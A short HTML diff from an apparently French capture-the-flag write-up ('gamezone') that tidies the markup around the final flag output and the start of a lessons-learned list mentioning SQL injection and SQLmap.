 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">a4b945830144bdd71908d12d902adeee</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@gamezone:/usr/share/webmin/file/# </span>
-</code></code></pre></div></div>
+</code></pre></div></div>
 <p>Le flag est donc</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>a4b945830144bdd71908d12d902adeee
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>a4b945830144bdd71908d12d902adeee
+</code></pre></div></div>
 <h3 id="lecons-apprises">Leçons apprises</h3>
 <ul>
 <li>Détecter manuellement les SQLi et automatiser le dump via SQLmap</li>
